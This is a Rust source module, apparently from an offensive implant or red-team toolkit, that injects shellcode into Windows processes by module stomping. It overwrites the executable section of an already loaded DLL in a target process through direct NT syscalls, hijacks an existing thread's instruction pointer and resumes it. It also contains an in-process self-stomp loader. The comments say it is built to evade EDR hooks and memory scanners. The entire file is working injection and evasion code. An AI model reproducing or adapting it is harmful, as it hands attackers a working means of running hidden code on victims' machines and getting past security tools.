#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{
            Debug::{GetThreadContext, SetThreadContext, CONTEXT},
            ToolHelp::{
                CreateToolhelp32Snapshot,
                Module32FirstW, Module32NextW, MODULEENTRY32W,
                Thread32First, Thread32Next, THREADENTRY32,
                TH32CS_SNAPMODULE, TH32CS_SNAPTHREAD,
            },
        },
        LibraryLoader::LoadLibraryA,
        Memory::VirtualProtect,
        Threading::{
            GetCurrentProcess, OpenThread,
            ResumeThread, SuspendThread,
            THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
        },
    },
};

const CONTEXT_FULL_AMD64: u32 = 0x0010_000B;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_READ: u32 = 0x20;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;

// DLLs we never stomp: EDR hooks live here, and overwriting them breaks our own evasion stack.
const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
const SKIP_HASHES: &[u32] = &[
    djb2(b"ntdll.dll"),
    djb2(b"kernel32.dll"),
    djb2(b"kernelbase.dll"),
    djb2(b"advapi32.dll"),
    djb2(b"user32.dll"),
];

// ─── Cross-process module stomping ──────────────────────────────────────────
//
// Unlike classic injection (VirtualAllocEx + CreateRemoteThread), stomp writes
// shellcode into an ALREADY-MAPPED DLL section in the target process.
// The VAD entry keeps the DLL name; no anonymous MEM_COMMIT block is created.
// The kernel-callback sequence is:
//   NtOpenProcess → NtProtectVirtualMemory(dll_region) → NtWriteVirtualMemory
//   → existing-thread context modify → ResumeThread
// — no CreateProcess, no NtUnmapViewOfSection, no fresh private allocation.

/// Inject `shellcode` into `pid` by stomping a suitable DLL's executable section
/// and hijacking an existing thread's RIP.  No new thread or process is created.
#[cfg(all(target_os = "windows", feature = "inject-stomp"))]
pub fn inject_stomp_remote(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_protect, nt_resume_thread, nt_write};

    // Need room for the shellcode + 12-byte trampoline (mov rax, imm64; jmp rax).
    let required = shellcode.len() + 12;

    let proc = super::open_process_rw(pid).ok_or("stomp: open failed")?;

    let stomp_va = unsafe { find_stompable_section(proc, pid, required) }
        .ok_or("stomp: no suitable DLL section")?;

    // Suspend a thread and save its full context before touching anything.
    // The saved RIP goes into the trampoline so the thread continues normally after shellcode.
    let (thread_h, mut ctx) = unsafe { suspend_and_capture(pid) }
        .ok_or("stomp: no thread in target")?;

    let orig_rip = ctx.Rip;

    // Payload = shellcode || mov rax, <orig_rip> (10B) || jmp rax (2B)
    let mut payload = shellcode.to_vec();
    payload.push(0x48); payload.push(0xB8);               // REX.W mov rax, imm64
    payload.extend_from_slice(&orig_rip.to_le_bytes());
    payload.push(0xFF); payload.push(0xE0);               // jmp rax

    // Make target region writable just long enough to write, then restore RX.
    // Avoids leaving any RWX page that memory scanners flag as suspicious.
    let mut rptr = stomp_va as *mut u8;
    let mut rsz  = payload.len();
    let mut old: u32 = 0;
    unsafe { nt_protect(proc, &mut rptr, &mut rsz, PAGE_EXECUTE_READWRITE, &mut old) };

    let mut written: usize = 0;
    unsafe { nt_write(proc, stomp_va as *mut u8, payload.as_ptr(), payload.len(), &mut written) };

    let mut rptr2 = stomp_va as *mut u8;
    let mut rsz2  = payload.len();
    let mut old2: u32 = 0;
    unsafe { nt_protect(proc, &mut rptr2, &mut rsz2, PAGE_EXECUTE_READ, &mut old2) };

    // Redirect thread into the stomped DLL section and resume.
    ctx.Rip = stomp_va as u64;
    if unsafe { SetThreadContext(thread_h as _, &ctx) } == 0 {
        unsafe { ResumeThread(thread_h as _); CloseHandle(thread_h as _); CloseHandle(proc as _); }
        return Err("stomp: SetThreadContext failed");
    }

    let mut sc: u32 = 0;
    unsafe {
        nt_resume_thread(thread_h as isize, &mut sc);
        CloseHandle(thread_h as _);
        CloseHandle(proc as _);
    }

    Ok(())
}

/// Find the absolute VA (in the target process address space) of the first executable
/// section in a non-critical DLL that has at least `min_size` bytes.
/// The first module (the target exe itself) is always skipped.
#[cfg(target_os = "windows")]
unsafe fn find_stompable_section(proc: isize, pid: u32, min_size: usize) -> Option<*const u8> {
    use crate::syscall::nt_read;

    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if snap == INVALID_HANDLE_VALUE { return None; }

    let mut entry: MODULEENTRY32W = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<MODULEENTRY32W>() as u32;
    let mut first = true;
    let mut result = None;

    if Module32FirstW(snap, &mut entry) != 0 {
        loop {
            if first {
                // First entry is the target process's own .exe — always skip.
                first = false;
            } else if entry.modBaseSize as usize > min_size {
                let len = entry.szModule.iter().position(|&c| c == 0)
                    .unwrap_or(entry.szModule.len());
                // Convert wide module name to lowercase ASCII bytes for DJB2
                let name: Vec<u8> = entry.szModule[..len].iter()
                    .map(|&c| if c >= b'A' as u16 && c <= b'Z' as u16 { (c + 32) as u8 } else { c as u8 })
                    .collect();
                let h = crate::obfs::djb2(&name);
                if !SKIP_HASHES.contains(&h) {
                    // Read the module's PE header from the target process
                    let mut hdr = [0u8; 0x1000];
                    let mut nread: usize = 0;
                    let read_len = 0x1000usize.min(entry.modBaseSize as usize);
                    if nt_read(proc, entry.modBaseAddr as *const u8,
                               hdr.as_mut_ptr(), read_len, &mut nread) >= 0 && nread >= 64 {
                        if let Some(va) = find_exec_section_va(entry.modBaseAddr, &hdr[..nread], min_size) {
                            result = Some(va);
                            break;
                        }
                    }
                }
            }

            entry = core::mem::zeroed();
            entry.dwSize = core::mem::size_of::<MODULEENTRY32W>() as u32;
            if Module32NextW(snap, &mut entry) == 0 { break; }
        }
    }

    CloseHandle(snap as _);
    result
}

/// Parse a PE header slice read from the target process and return a pointer
/// (in target's VA space) to the first executable section with `virtual_size >= min_size`.
fn find_exec_section_va(base: *mut u8, hdr: &[u8], min_size: usize) -> Option<*const u8> {
    if hdr.len() < 64 { return None; }
    if u16::from_le_bytes([hdr[0], hdr[1]]) != 0x5A4D { return None; }

    let e_lfanew = u32::from_le_bytes([hdr[0x3C], hdr[0x3D], hdr[0x3E], hdr[0x3F]]) as usize;
    if e_lfanew + 24 > hdr.len() { return None; }
    if u32::from_le_bytes([hdr[e_lfanew], hdr[e_lfanew+1], hdr[e_lfanew+2], hdr[e_lfanew+3]]) != 0x0000_4550 {
        return None;
    }

    let fh = e_lfanew + 4;
    let num_sections = u16::from_le_bytes([hdr[fh+2],  hdr[fh+3]])  as usize;
    let opt_size     = u16::from_le_bytes([hdr[fh+16], hdr[fh+17]]) as usize;
    let sh_base = fh + 20 + opt_size;

    for i in 0..num_sections {
        let s = sh_base + i * 40;
        if s + 40 > hdr.len() { break; }
        let chars = u32::from_le_bytes([hdr[s+36], hdr[s+37], hdr[s+38], hdr[s+39]]);
        if chars & IMAGE_SCN_MEM_EXECUTE != 0 {
            let va  = u32::from_le_bytes([hdr[s+12], hdr[s+13], hdr[s+14], hdr[s+15]]) as usize;
            let vsz = u32::from_le_bytes([hdr[s+8],  hdr[s+9],  hdr[s+10], hdr[s+11]]) as usize;
            if vsz >= min_size {
                return Some(unsafe { base.add(va) });
            }
        }
    }
    None
}

/// Suspend the first enumerable thread belonging to `pid` and return
/// its handle + full CONTEXT (so the caller can read orig_rip and then set new Rip).
#[cfg(target_os = "windows")]
unsafe fn suspend_and_capture(pid: u32) -> Option<(isize, CONTEXT)> {
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE { return None; }

    let mut entry: THREADENTRY32 = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut result = None;

    if Thread32First(snap, &mut entry) != 0 {
        loop {
            if entry.th32OwnerProcessID == pid {
                let th = OpenThread(
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    FALSE,
                    entry.th32ThreadID,
                );
                if th != 0 {
                    SuspendThread(th as _);
                    let mut ctx: CONTEXT = core::mem::zeroed();
                    ctx.ContextFlags = CONTEXT_FULL_AMD64;
                    if GetThreadContext(th as _, &mut ctx) != 0 {
                        result = Some((th as isize, ctx));
                        break;
                    }
                    // GetThreadContext failed: release this thread and try the next one
                    ResumeThread(th as _);
                    CloseHandle(th as _);
                }
            }
            entry = core::mem::zeroed();
            entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
            if Thread32Next(snap, &mut entry) == 0 { break; }
        }
    }

    CloseHandle(snap as _);
    result
}

// ─── In-process self-stomping (kept for local shellcode execution) ─────────────

/// Load `module_name` into the current process, overwrite its executable section
/// with `shellcode`, and execute it.  Permissions are restored to the original
/// value after execution.
#[cfg(target_os = "windows")]
pub fn inject_stomp(module_name: &str, shellcode: &[u8]) -> super::InjectResult {
    use std::ffi::CString;
    use windows_sys::Win32::System::Diagnostics::Debug::FlushInstructionCache;

    let mod_cstr = CString::new(module_name).map_err(|_| "invalid module name")?;
    let hmod = unsafe { LoadLibraryA(mod_cstr.as_ptr() as *const u8) };
    if hmod == 0 {
        return Err("LoadLibraryA failed");
    }

    let base = hmod as *const u8;
    let (section_ptr, section_size) = find_text_section(base).ok_or("no executable section")?;

    if section_size < shellcode.len() {
        return Err("section too small for shellcode");
    }

    let mut old_prot: u32 = 0;
    if unsafe {
        VirtualProtect(
            section_ptr as *const core::ffi::c_void,
            section_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        )
    } == 0 {
        return Err("VirtualProtect RWX failed");
    }

    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), section_ptr, shellcode.len());
        FlushInstructionCache(
            GetCurrentProcess(),
            section_ptr as *const core::ffi::c_void,
            shellcode.len(),
        );
        // Restore original protection before executing
        VirtualProtect(
            section_ptr as *const core::ffi::c_void,
            section_size,
            old_prot,
            &mut old_prot,
        );
    }

    let exec: unsafe fn() = unsafe { core::mem::transmute(section_ptr) };
    unsafe { exec() };

    Ok(())
}

#[cfg(target_os = "windows")]
fn find_text_section(base: *const u8) -> Option<(*mut u8, usize)> {
    let pe = unsafe { core::slice::from_raw_parts(base, 0x1000) };

    if u16::from_le_bytes([pe[0], pe[1]]) != 0x5A4D { return None; }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if u32::from_le_bytes([pe[e_lfanew], pe[e_lfanew+1], pe[e_lfanew+2], pe[e_lfanew+3]]) != 0x0000_4550 {
        return None;
    }

    let fh = e_lfanew + 4;
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt  = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let sh_base = fh + 20 + size_of_opt;

    for i in 0..num_sections {
        let s = sh_base + i * 40;
        let chars = u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]);
        if chars & IMAGE_SCN_MEM_EXECUTE != 0 {
            let va  = u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]);
            let vsz = u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]);
            let ptr = unsafe { (base as *mut u8).add(va as usize) };
            return Some((ptr, vsz as usize));
        }
    }
    None
}
